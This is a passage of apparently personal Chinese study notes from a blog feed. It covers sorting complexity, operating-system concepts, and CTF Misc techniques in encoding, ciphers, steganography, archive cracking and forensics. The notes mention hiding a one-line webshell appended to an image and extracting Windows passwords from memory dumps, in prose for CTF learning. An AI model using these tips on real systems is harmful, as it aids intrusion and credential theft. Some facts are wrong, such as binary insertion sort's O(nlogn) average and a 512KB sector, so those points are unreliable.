class="table-container"><table><thead><tr><th>算法</th><th>平均时间复杂度</th><th>备注</th></tr></thead><tbody><tr><td>直接插入排序</td><td>O(n^2^)</td><td></td></tr><tr><td>折半插入排序</td><td>O(nlogn)</td><td></td></tr><tr><td>希尔排序</td><td>O(n^1.3^)</td><td>不稳定</td></tr><tr><td>冒泡</td><td>O(n^2^)</td><td></td></tr><tr><td>快排</td><td>O(nlogn)</td><td>不稳定</td></tr><tr><td>简单选择排序</td><td>O(n^2^)</td><td>不稳定</td></tr><tr><td>堆排序</td><td>O(nlogn)</td><td>不稳定</td></tr><tr><td>二路归并排序</td><td>O(nlogn)</td><td></td></tr><tr><td>基数排序</td><td>O(d(n+r))</td><td></td></tr><tr><td>计数排序</td><td>O(n+k)</td></tr></tbody></table></div><h3 id="外部排序"><a href="#外部排序" class="headerlink" title="外部排序"></a>外部排序</h3><ul><li>着重了解大文件分块，分归并段，内部排序，内部归并过程（排序是段内，归并是段间，注意区分）</li><li>优化：<ul><li>置换选择排序生成长度不等的初始归并段</li><li>最佳归并树确定归并顺序（即哈夫曼树）</li><li>多路归并败者树实现内部归并</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 408 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OS疑难杂症</title>
      <link href="/2024/07/03/os%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/07/03/os%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="任务、作业与进程、线程"><a href="#任务、作业与进程、线程" class="headerlink" title="任务、作业与进程、线程"></a>任务、作业与进程、线程</h3><p>结论：作业下面多个任务，任务下面多个进程，进程下面多个线程。任务/作业面向用户的抽象概念，进程/线程面向CPU实体概念</p><p>作业简单理解为批处理系统的一次运行，这次运行有多个任务，完成每个任务又需要多个进程协同工作。在没有被真正运行时，作业在外存的等待队列中等待执行</p><p>就拿bash脚本来说，一整个脚本是一个作业，这个作业里面我需要用word打开文档、又需要打开音乐、需要浏览器打开指定格式参考文本，这就包括了三个任务，每个任务下可能又需要打开多个进程</p><blockquote><p>个人认为作业算是批处理系统中老概念了，相当于现在的程序就行</p><p>协程：一种轻量级的线程，与线程最大区别就是，状态存放在堆中，可以暂停。详细参考<a href="https://zplutor.github.io/2022/03/25/cpp-coroutine-beginner/">C++20协程入门教程 | Zplutor’s</a>写的非常好</p></blockquote><h3 id="同步互斥问题"><a href="#同步互斥问题" class="headerlink" title="同步互斥问题"></a>同步互斥问题</h3><p>首先区别一下同步和互斥</p><ul><li>同步：是指两个进程在并发运行的条件下仍要按照一定顺序访问资源。相当于入口必须先A进后B进</li><li>互斥：指的是两个进程要访问同一个资源，但是该资源只能被一个进程访问。相当于入口只能通过一人</li></ul><p>互斥原则：空闲让进、忙则等待、有限等待、让权等待（非必要）</p><p>同步互斥实现方式：</p><ul><li><p>软件实现：peterson算法</p></li><li><p>硬件：关中断、借助硬件实现的原语操作（TestAndSet、Swap）</p></li><li><p>互斥锁</p></li><li><p>信号量：即PV操作，需要记住P—，V++，将相应代码对应</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">wait</span><span class="params">(semaphore S)</span>&#123;</span><br><span class="line">S.value--;</span><br><span class="line"><span class="keyword">if</span>(S.value &lt; <span class="number">0</span>)&#123;</span><br><span class="line">add this process to S.L;</span><br><span class="line">block(S.L);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">signal</span><span class="params">(semaphore S)</span>&#123;</span><br><span class="line">S.value++;</span><br><span class="line"><span class="keyword">if</span>(S.value &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">remove a process P from S.L;</span><br><span class="line">wakeup(P);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>管程：和之前的进、线、协程都不同，管程专门用于同步互斥，是一个抽象的数据结构。以面向对象来说，管程就是一个类，其中封装了互斥资源，而且对该资源的相关操作也都封装在该类中，同时只能由一个实体访问</p></li></ul><h3 id="段式内存管理和程序中段的关系"><a href="#段式内存管理和程序中段的关系" class="headerlink" title="段式内存管理和程序中段的关系"></a>段式内存管理和程序中段的关系</h3><blockquote><p> 需要先明确的一点是目前基本都是页式内存管理（个人OS）</p></blockquote><p>程序中的段我们以ELF文件为例</p><ul><li>当ELF在外存时分的代码段、数据段、共享段等等（也可以叫节，这里用于区分）</li><li>加载到内存时，这些段会<strong>根据各自的属性</strong>，重新合并，来放置到不同的物理页（下面的page）中</li><li>这些合并后的段，在内存上都不算是连续的，因为一页一般不会占满（页内碎片）</li></ul><p>而段式管理中的段则对应于上面的物理页，则可以推出这两个段不是一个东西</p><h3 id="内存映射过程（段页式为例"><a href="#内存映射过程（段页式为例" class="headerlink" title="内存映射过程（段页式为例"></a>内存映射过程（段页式为例</h3><ol><li><p>CPU拿到逻辑地址A，取出前几位为段号S</p><blockquote><p>如果是二级页表，将段表过程换位一级页表即可</p></blockquote></li><li><p>判断段号是否越界，如果S&gt;=段表长度M，则产生越界中断</p><blockquote><p>这里的段表长度M来自相应界地址寄存器，下面的段表起始位置来自相应的基地址寄存器</p><p>还有判断的方法就是直接在寄存器中给出上下限地址寄存器</p></blockquote></li><li><p>在段表中拿着段号S找到对应的段表项，取出对应页表地址</p><blockquote><p>在仅有页式管理时，单级页表的位置由页表寄存器PTR指出，多级页表的话，对应的一级页表寄存器叫做页目录基址寄存器</p></blockquote></li><li><p>逻辑地址A后再取页号K，同样判断是否越界</p></li><li><p>之后根据K在页表中查找对应页表项，获取其中的物理块号</p></li><li><p>拼接最终得到物理地址</p></li></ol><blockquote><p>目前常用的就是页式管理，采用多级页表+TLB的方式</p></blockquote><h3 id="基本页式内存管理和请求页式管理区别"><a href="#基本页式内存管理和请求页式管理区别" class="headerlink" title="基本页式内存管理和请求页式管理区别"></a>基本页式内存管理和请求页式管理区别</h3><ul><li><p>基本页式、基本段式、基本段页式中进程的所有页/段一次性都装载到内存上，因而不存在置换、请求等操作</p></li><li><p>请求式分页、分段、段页式中进程的页并不会一次性全部加载到内存，而是加载到虚拟内存中（内存+外存交换区），当需要交换区中的页时，就进行请求调页，内存驻留集有空就直接给，否则就进行页面置换（交换区足够放置进程所需东西）</p><blockquote><p>交换区不够的话，则不会被修改的文件将直接从文件区加载</p><p>unix系统中，未运行过的页都在外存文件区，只有从内存上换下来的才会放到交换区。</p></blockquote></li></ul><h3 id="内存映射文件"><a href="#内存映射文件" class="headerlink" title="内存映射文件"></a>内存映射文件</h3><p>将一个文件映射到进程的虚拟地址空间中，而非通过文件I/O操作访问，这时访问该文件就相当于访问内存中的一块大号连续字符，不会像I/O操作一样将文件全部读入，而是需要那一页时再单独读入，并利用关闭映射时的回写操作从而实现写文件</p><p>共享内存基于上述原理实现，一个文件被映射到了多个进程的虚拟地址空间中（页表项），当进程A在映射到这个文件上的操作时，另一进程B由于实际上看的是同一份，这时就能立刻看到上一个进程的操作</p><p>COW：copy on write，父子进程共享相同的页面工作，然后子进程修改页面时标记写时复制，此时系统就会创建该页面的副本给子进程写，而父进程还使用原先的页面。</p><blockquote><p>在这个过程中子进程需要一个新的页，除了申请之外，还可以借助页面池分配。</p><p>什么是池，简单来讲就是提前初始化过的东西，需要就拿，用完就放回，省去了一些步骤</p></blockquote><h3 id="工作集、抖动、驻留集相关概念"><a href="#工作集、抖动、驻留集相关概念" class="headerlink" title="工作集、抖动、驻留集相关概念"></a>工作集、抖动、驻留集相关概念</h3><p>概念区别</p><ul><li><p>驻留集是一个进程在内存中被分配的页框数目，因为不需要全部一次装进。比如此时驻留集分了两块，其中放了进程的第2、3块</p><blockquote><p>虚拟内存中的叫页块，真实内存的是页框</p></blockquote></li><li><p>工作集是一个进程在一段时间内需要用到的页块集合，需要注意的是这是一个序列，不存在指明内存还是交换区的问题。工作集序列2、3、5、4</p></li><li><p>抖动就是刚放入驻留集的页块（因为页面置换）又要被马上换出来，或者刚换出来的马上又要用到而放驻留集中</p></li></ul><p>驻留集和缺页过程</p><ul><li><p>驻留集是进程在内存中的页框集合。</p></li><li><p>进程的页表中页号应该是全的，但是因为驻留集的存在导致部分页号对应的页框号为空（这部分位于外存的交换区，而非内存中），因此需要通过页面置换算法来从驻留集中选一个页框出来，选出来的页框来存放新的东西</p><blockquote><p>这里想要说明的是，题目中一旦给定驻留集中的所有页框号，之后该进程所有的页号，都会存在于这几个页框号中</p></blockquote></li></ul><h3 id="基本IO操作"><a href="#基本IO操作" class="headerlink" title="基本IO操作"></a>基本IO操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">open</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * pathname, <span class="type">int</span> flags)</span>;</span><br><span class="line">fd = open(<span class="string">&quot;flag.txt&quot;</span>,O_RDONLY);</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">read</span><span class="params">(<span class="type">int</span> fd, <span class="type">void</span> * buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line">read(fd,&amp;ch,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">write</span> <span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="type">void</span> * buf, <span class="type">size_t</span> count)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">close</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br></pre></td></tr></table></figure><p>需要说明的是，当open打开文件时，该文件并不会被加载到内存中，而是该文件对应的文件记录块FCB会被加载到内存中。（参考下面的VFS）</p><blockquote><p>内存中有个系统的打开文件表、进程的打开文件表，各自的打开表中都会添加该文件相关条目</p></blockquote><p>具体open如何运行有待后续进一步学习</p><h3 id="磁盘分区格式化"><a href="#磁盘分区格式化" class="headerlink" title="磁盘分区格式化"></a>磁盘分区格式化</h3><p>磁盘初始化过程</p><ol><li><p>低级格式化/物理格式化：一般是由厂商操作，将其分成一个个扇区，包括头部、数据区、尾部，并利用CRC字段对扇区进行校验，其中的坏块也会被标记不进行使用</p></li><li><p>分区：将每个分区的起始扇区和大小都记录到磁盘主引导记录的分区表中</p></li><li><p>逻辑格式化/高级格式化：这里开始安装文件系统，各个分区都可以有自己的文件系统</p><blockquote><p>文件系统安装后，因为默认扇区通常是512KB，为提升效率，现在的OS经常会将几个扇区给合并到一起，windows中的簇，linux中的块</p></blockquote></li></ol><p>引导过程：</p><ol><li>激活CPU，读取ROM中的boot程序，执行BIOS</li><li>构建中断向量表，进行硬件自检</li><li>加载硬盘，找到引导硬盘后，读取其开头的MBR主引导记录</li><li>MBR中的小程序将从MBR后的分区表中找到引导分区（即OS启动程序所在分区）</li><li>读取引导分区中的第一个扇区，即引导扇区，运行OS启动程序</li></ol><h3 id="成组链接法过程"><a href="#成组链接法过程" class="headerlink" title="成组链接法过程"></a>成组链接法过程</h3><blockquote><p>内容分属于文件系统中，空闲空间管理，其他还有，空闲表法、空闲链表法、位图法等。FAT表中的也算是一种</p><p>当然与空闲空间管理对应的有文件的空间管理（也叫文件的物理结构），顺序存储、链式存储、索引存储等</p><p>（也可以将空闲空间当作文件管理，感觉没啥毛病</p></blockquote><p>现在假设每组10块，第一块中存放着&lt;本组空闲块数目，下一组开头块&gt;，其它的都指向空闲块，第一组存放在内存专用栈——空闲盘块号栈。</p><ul><li><p>分配时：从第10块（栈顶），向上开始分配，分配到第一块时，将下一组内容内容读入该栈，同时将下一组内容读入栈</p></li><li><p>回收时：回收的盘块至于栈顶，当数量到达一组最大时，表示栈满，将目前栈中的10个指针存入新回收的盘块，并将这个新回收的盘块号作为新栈底</p><blockquote><p>注意移动栈顶时，本组空闲块数目对应++/—；手画一边过程方便理解</p></blockquote></li></ul><h3 id="VFS及四大对象"><a href="#VFS及四大对象" class="headerlink" title="VFS及四大对象"></a>VFS及四大对象</h3><p>VFS即虚拟文件系统，因为每个分区都可以有不同的文件系统，而我们不可能在不同的分区有不同的操作，<code>ntfs_read</code>、<code>fat_read</code>等，于是乎VFS层就是相当于屏蔽了这层差异，给上面的使用者提供了统一的接口<code>read</code>。</p><p>VFS只存在于内存中，并不实际存在于外存。四大数据结构如下</p><ul><li><p>超级块：superblock，一个超级块对应一个文件系统，用于描述文件系统的信息。各个超级块对象都用双向循环链表链接起来</p></li><li><p>索引节点：inode，保存文件的元数据（也就是属性）。需要区分inode在外存和内存上的形式，当文件打开后，其索引节点会被复制到内存中，并添加额外的信息，比如“访问计数”、“逻辑设备号”等内容。</p><blockquote><p>这里可以引申到软链接和硬链接内容</p></blockquote></li><li><p>文件：file，又一个结构体，并非是文件本身，其中保存了文件读写指针、锁变量、文件<strong>路径</strong>等内容。每当打开一个文件，该结构体就会插入到系统打开文件表中（双链表形式），而用户则会有用户打开文件表来管理所有的file结构体。</p></li><li><p>目录：dentry，linux中一切皆文件，目录也是目录文件，当然也对应着一个inode。与inode一样外存到内存会有些许不同</p><blockquote><p>区分VFS仅在内存中这句话，外存上的inode/dentry结构不算是VFS</p></blockquote></li></ul><p>Linux中管理进程的结构体是task_struct，其中有个变量指向用户打开文件表，根据文件描述符可以找到对应的file结构体，获取文件的路径，找到目录，找到inode索引节点，从而获取文件</p><blockquote><p>常说的文件描述符其实就是这个文件在用户打开文件表中的下标</p><p>不同于现在的面向对象，这里面的四大对象都是通过其中的一个operation指针来指向对应的操作结构体，其中存放一系列操作函数。并非都挤在一个struct中</p></blockquote><h3 id="IO软件层次结构过程"><a href="#IO软件层次结构过程" class="headerlink" title="IO软件层次结构过程"></a>IO软件层次结构过程</h3><p>从上到下：用户层软件、设备独立性软件、设备驱动软件、中断处理软件、硬件</p><blockquote><p>要注意这里的设备独立性软件和前面的VFS有异曲同工之妙，都是用于屏蔽下面的差异</p></blockquote><p>大致过程scanf()</p><ol><li>scanf函数调用系统调用封装函数read()，其中有一条陷阱指令，借此进入内核</li><li>内核调出read对应的sys_read系统调用服务例程进行执行，在设备无关层进行若干调用</li><li>最终来到设备驱动层处理，设备驱动程序对本次IO进行初始化，阻塞用户进程P，CPU执行其他进程</li><li>用户在键盘上输入字符后，外设向CPU发出中断请求</li><li>CPU响应中断后，启动键盘中断处理通用驱动程序对中断进行通用处理后，唤醒具体的处理键盘输入的驱动程序</li><li>上述专用驱动程序将字符从键盘控制器读入系统缓冲区</li><li>传输完成后，唤醒P并插入就绪队列，进行中断返回，进程P也从系统调用返回</li></ol><blockquote><p>设备独立性软件主要是对各种设备之间的统一的操作，比如打开关闭等</p><p>设备驱动软件则是对应具体种类，具体硬件的操作，比如磁盘当中的地址转为磁面、磁道、扇区</p><p>中断处理相当于是通知机制，硬件的驱动运行完成后，借助中断告知内核</p></blockquote><h3 id="IO设备分配过程"><a href="#IO设备分配过程" class="headerlink" title="IO设备分配过程"></a>IO设备分配过程</h3><div class="table-container"><table><thead><tr><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>LUT逻辑设备表</td><td>逻辑设备名——》物理设备名+驱动程序入口</td></tr><tr><td>SDT系统设备表</td><td>系统一张一个设备对应一个条目；物理设备名——》DCT+驱动程序入口</td></tr><tr><td>DCT设备控制表</td><td>每个设备都有一张，说明属性；DCT——》COCT</td></tr><tr><td>COCT控制器控制表</td><td>每个设备控制器有一张，每个都由一个通道控制，；COCT——》CHCT</td></tr><tr><td>CHCT通道控制表</td><td>CHCT——》COCT</td></tr></tbody></table></div><ol><li><p>LUT逻辑设备表，每个表项中有三项&lt;逻辑设备名，物理设备名，设备驱动程序入口地址&gt;。进程根据I/O请求中的逻辑设备名来获取物理设备名</p><blockquote><p>该表可以整个系统中设置一张，也可以每个用户一张，这样不同的用户就可以使用相同的逻辑设备名</p></blockquote></li><li><p>进程根据上一步的物理设备名查找SDT，从中找到对应设备的DCT，从而了解该设备状态</p><blockquote><p>如果忙，则将进程的PCB挂到DCT下对应的等待队列；否则就分配</p></blockquote></li><li><p>设备分配后，来到对应的COCT，同样也是根据状态来是否分配</p></li><li><p>分配好控制器后，来到CHCT，查询状态据此分配</p></li><li><p>只有当设备、控制器、通道依次分配成功后，才可以启动设备进行数据传送</p></li></ol><h3 id="中断的详细过程"><a href="#中断的详细过程" class="headerlink" title="中断的详细过程"></a>中断的详细过程</h3><p>每个中断源都有各自的中断请求标记触发器，这些触发器共同组成中断请求标记寄存器。中断异常由硬件进行检测</p><p>当：有中断请求、没有关闭中断、指令执行完成后，CPU开始响应中断</p><ol><li><p>关中断，令中断允许触发器IF=0</p></li><li><p>保存当前断点位置（x86的保存PC和PSW，MIPS的保存PC到特殊寄存器）</p></li><li><p>进行中断识别，一般是中断向量，即通过中断类型号，在中断向量表中找到对应中断向量，从而定位中断服务程序</p><blockquote><p>此前的都属于中断隐指令，由硬件实现；后面都属于中断程序范畴，软件实现</p></blockquote></li><li><p>保存现场和屏蔽字</p><blockquote><p>各个中断源的屏蔽触发器共同构成屏蔽字寄存器，该寄存器用于多重中断</p></blockquote></li><li><p>执行中断服务程序</p></li><li><p>恢复现场和屏蔽字</p></li><li><p>开中断，中断返回</p></li></ol><p>如果允许多重中断的话，需要在第五步前后，加一个开中断和关中断</p>]]></content>
      
      
      <categories>
          
          <category> 考研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 408 </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc</title>
      <link href="/2024/05/14/Misc/"/>
      <url>/2024/05/14/Misc/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h3 id="编码与古典密码"><a href="#编码与古典密码" class="headerlink" title="编码与古典密码"></a>编码与古典密码</h3><p><strong>编码</strong>：将一定序列的二进制串赋予意义；ASCII码、GBK(GB2312/18030)、UTF、ANSI；在早期还有专用的数字编码，即二-十进制编码（BCD码）：8421码、2421码、格雷码；为保证传输数据的准确性，再加入额外的可信性编码：奇偶校验码、海明码、ECC（椭圆曲线？）、Chipkill等；</p><ul><li><p>标准ASCII编码：8bits，最高位为0，支持128个字符；后面128个有用的为扩展的版本，各地区情况不同；除UTF16和32不兼容外，其他上面说到的均兼容；</p></li><li><p>GBK：国标；GBK2312，简体中文字符集6700+汉字&amp;&amp;拉丁字母等；GBK在2312基础上收录20000+汉字，其中还包括繁体；18030，收录70000+汉字&amp;&amp;少数民族</p></li><li><p>UTF：包括UTF-8/-16/-32，表示的是用的多少bit来表示字符；在UTF-8中，与ASCII码表示一致；但在16与32中与ASCII码不同方式</p></li></ul><div class="table-container"><table><thead><tr><th>字节数</th><th>二进制编码格式</th></tr></thead><tbody><tr><td>单字节</td><td>0xxxxxxx</td></tr><tr><td>双字节</td><td>110xxxxx 10xxxxxx</td></tr><tr><td>四字节</td><td>11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td></tr></tbody></table></div><blockquote><p>Unicode：万国码、单一码，包含世界上几乎所有的符号；是一个字符集，并未赋予意义</p></blockquote><ul><li><p>ANSI：根据系统中设置的地区不同，会自动地更换为相应的编码，是Windows的编码机制；可以通过修改—语言与地区—来更改；美国就是ASCII，中国就是GBK；</p></li><li><p>摩斯电码：在通信领域常用，点横构成（基本都是一长一短）；该领域其他编码有敲击码（26字母放在5x5的格子中，CK共用）、曼彻斯特编码（与高低电平不同，一般使用高低转换表示）、格雷编码（从0-9每位的二进制表示仅与上一位只有一个位的差别，有多种表示）</p></li><li><p>Base编码</p><ul><li>base64：将ASCII对应二进制写出来，每个字符一个字节有8bit，2^6^=64（起码有大小写的A-Z，0-9），因此对二进制串每6个为一组，在每组前加上00（能将3个字符/字节变成4个字符），再将每组二进制串对照更新；如果原文并没有3的倍数以上的字符，则会在base64编码后加上一个或两个“=”；</li><li>base32是5个一组，共有32个字符；base16是4个一组，共16个字符0-9、A-F</li><li>base58、85、91、92、36、62</li></ul></li></ul><p><strong>古典密码</strong>：</p><ul><li>栅栏密码：传统：N位一组，依次链接每组的1，2….得到密文；变体W型栅栏；</li><li>移位密码：1.传统的凯撒密码，从AB…YZ进行后移固定长度，若移3，得DE…BC；2.维吉尼亚密码：由密文密钥构成，在表中按照密钥长度向后依次替换（用完从头再来），直到明文变完</li><li>棋盘密码：将26个字母放到5x5的格子中，其中j和i共用一个</li><li>BrainFuck：由 <code>&lt; &gt; + . [ - ] ,</code>等八种符号构成；类似的：1.jsFuck：<code>( ! + ) [ ]</code>符号构成，在浏览器控制台中即可解密；2.Ook：如名，由<code>O o . ? k</code>构成；3.URL编码：由<code>%</code>与十六进制数构成；4.jother：由<code>![]+</code>构成；5.jjencode：有<code>$$ = ~ sojson等</code>内容构成；5.Quoted-printable：在基于MIME下的表示任何8位的串<code>=FF</code>只有=与十六进制字符</li><li>当铺密码：有简单中文构成，<code>羊大王中王</code>即63444</li><li>键盘密码：1.QWE替换：字母区左到右、上到下，用ABCD….替换；2.QWE包围：六个或者几个字母围住的；3.九键：手机九键</li><li>猪圈密码：奇怪的图形（方的半包围与点构成），找表对照；类似的有：埃及文字、宝可梦图腾、跳舞的小人、精灵语？、盲文、夏多密码（有线条在内的圈）、圣堂武士（箭头&amp;点&amp;三角）、外星人密码、音乐密码、银河字母、摩斯密码、天干地支表、培根密码（26个字母用<code>a</code>和<code>b</code>表示）</li><li>佛曰密码：以<code>佛曰</code>开头，或者<code>新佛曰</code>等；同理的有“熊曰”，“呜嗷啊~”构成的兽言，核心价值观编码？：富强民主文明和谐，自由平等公正法治，爱国敬业诚信友善</li></ul><p>此外有的题目会进行字母替换，而且给的题目又特别长，此时可以根据英文词频分析，来进行替换，参考<a href="https://quipqiup.com/">CTF wiki</a></p><p>黑科技—ciphey一个使用人工智能的密码破解工具，当然只是有可能是对的</p><h3 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h3><p>最基本的莫过于注意搜索文件属性、文件二进制打开搜索字符串（strings搜索文件）</p><p>其他手段需要通过二进制打开，根据文件头来判断文件类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">图片</span><br><span class="line">JPEG/jpg:头FF-D8-FF;尾FF-D9</span><br><span class="line">PNG:头89-50-4E-47-0D-0A-1A-0A;尾AE-42-60-82 </span><br><span class="line">GIF:头47-49-46-38-39/37-61;尾00-3B</span><br><span class="line">BMP:头42-4D</span><br><span class="line">压缩包</span><br><span class="line">ZIP:头50-4B-03-04;尾50-4B</span><br><span class="line">RAR:头52-61-72-21</span><br><span class="line">音频</span><br><span class="line">WAV:头57-41-56-45</span><br><span class="line">视频</span><br><span class="line">AVI:头41-56-49-20</span><br></pre></td></tr></table></figure><ul><li><p>文件拼接</p><p>将两种文件直接拼接在一起，常见的就是图片后面跟一个压缩包；最直接的就是用二进制编辑器打开之后，找出对应两个文件的头和尾，之后将其另存为其他类型的文件即可。</p><ul><li>工具：binwalk（kali）、foremost</li><li>用途：在实际攻击中可以将一句话木马拼接在图片后，图片软件只识别到图片文件头就结束</li></ul></li><li><p>LSB隐写</p><p>LSB指的是最低有效位，原理跟RGB有关，常出现于png中：一个颜色占据8bit，从低到高位，一个像素三种颜色（红绿蓝），每一个像素的低位颜色稍加更改，对于人的肉眼来说不明显。常常在其中某一层会隐藏信息，有时候直接就是flag，有时候会再来个二维码之类；简单点的相关RGB利用就是将字符串的ASCII码进行RGB转换为图片</p><ul><li>工具：stegsolve、zsteg（kali）、Cloacked-Pixel（有密钥）</li></ul></li><li><p>基于文件属性</p><p>IHDR隐写：指的是更改png图片中的宽高等来隐藏信息，一般来说题目实际的高度会长一点，对宽度下手容易导致图片没法看</p><p>在png的二进制中49-48-44-52=IHDR，从开头算起17-20字节为宽、21-24字节为高。有些图片还会加有CRC校验报错，会根据图片内容进行验算，不对照则不能正常打开。</p><p>IDAT数据块连续：png图片是由一个个的IDAT数据块构成的，除了最后一个其他的都有固定的相同长度，不一样的一般都是多出来的，可以分离出来进一步查看</p><p>工具：pngcheck</p></li><li><p>一些杂的</p><ul><li>gif：一些图片的拼接，目标/信息常位于其中的某一帧，可以将特殊帧都给提取出来再进一步挖掘；工具：steghide、stegseek、PhotoShop</li><li>二维码：左上-右上-左下为大方块叫做位置探测图形；九宫格中其他位置都属于校正图形；一般形式由拼接、修复二维码等，当然二维码作为图形出现时也可以与前面的技术结合。工具：QR Research、QRazyBox（修复二维码）</li><li>水印：原图经傅里叶变换—&gt;频谱图+水印经编码—&gt;再次傅里叶逆变换得到含水印的图像，一般题目中会给两张一毛一样的图，一般使用脚本破解</li></ul></li><li><p>压缩包</p><ul><li><p>伪加密：常见于zip，少部分会有rar，这里仅对zip进行介绍。ZIP文件格式如下：压缩源文件数据区【文件头+文件数据+数据描述符】+压缩文件目录区+压缩源文件目录结束标志。在ZIP（小端从左向右看时）中涉及504b0304向后第2个字（1400后）和504b0102向后第2个字（14001400后），只有当一个偶数一个奇数是伪加密，两个偶数不加密，两个奇数加密；</p></li><li><p>密码破解：有时候压缩包的密码会藏在其他文件中，如果有提示弱密码或者已知部分密码的话，可以用ARCHPR、ZIPerello、AZPR进行爆破；</p></li><li><p>明文攻击：会给我们一个带密码的压缩包和其中的一个文件。判断该压缩包里面的文件是否和所给文件一样，可以将所给文件进行压缩然后查看生成压缩包内部显示的CRC，之后进行对比（注意使用相同的压缩算法）；确定后就可以使用上述软件或bkcrack进行解密</p></li><li>CRC爆破：长密码+多个相同大小的小文件，工具CRC32.py爆破</li></ul></li><li><p>音频</p><p>一般题目格式为.wav，经常与摩斯电码进行结合，使用Audacity进行音频分析，要么会多出来一段小杂音，要么就是听不懂，但是只有高低的波形；此外还可以借助频谱图来隐藏信息，在上述软件中打开频谱图也许能看到flag；</p><p>对于mp3格式的题目，一般就是使用MP3stego；其余的大多就是silentEye进行加解密；在视频中还有的工具用来隐藏音频mkvtool</p></li><li><p>字符串</p><p>零宽度字符，一种字节宽度为0的不可打印的Unicode字符，占位置但是不可见，使用winhex/vim/01editor打开能看到<code>&lt;200a&gt;</code>之类的内容；</p><p>不可见字符隐写，利用空格和制表符写的东西，可以是摩斯、培根、SNOW隐写、white_space（一种编程语言，由空格回车tab组成）</p></li></ul><p>除了上述所说外，还有其他各种隐写术，例如根据DCT域的JPG的隐写（stegdetect、JPHS）、文本隐写术、像素点合成、大拼图等，除此之外根据目前的AI技术也会有许多此类隐写应用，这里不再过多叙述</p><h3 id="流量分析-amp-数字取证"><a href="#流量分析-amp-数字取证" class="headerlink" title="流量分析&amp;数字取证"></a>流量分析&amp;数字取证</h3><p>流量分析大致包括流量包的修复、协议分析、数据提取。Wireshark一把梭！（pyshark/tshark）</p><ul><li>对于流量包的修复pcap文件，常用工具pcapfix，也有在线网站；</li><li>协议分析常见：OSI类、WIFI蓝牙无线类、modbus工控类、USB流量等</li></ul><p>HTTP：SQL注入流量、后门流量、数据统计、数据提取</p><p>数字取证大致分为内存、磁盘取证；综合性付费工具：火眼、取证大师、盘古石；</p><ul><li><p>内存取证：</p><p>工具：Volatility【vol2（主流-在github）和vol3】、EasyRecovery、MedAnalyze、FTK；</p><blockquote><p>vol2插件minikatz获取windows密码、dumpfile提取内存文件、screenshot提取出内存获取时的桌面、pslist获取内存镜像</p></blockquote><p>常见后缀.raw、.vmem、.img；</p></li><li><p>磁盘取证：工具：winhex、x-way；</p></li></ul><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>首先需要查看一下安卓架构图，这里就不贴了，网上很多。从中我们不难看到，其使用的还是Linux内核，但是在其上面用的却是Java体系，可以说算是一种Java系统</p><p>Java是一种虚拟机语言，但不同于传统的基于栈的JVM，Android（&lt;5.0）默认使用基于寄存器结构的Dalvik虚拟机，5.0以上使用ART虚拟机</p><h4 id="Dalvik和ART"><a href="#Dalvik和ART" class="headerlink" 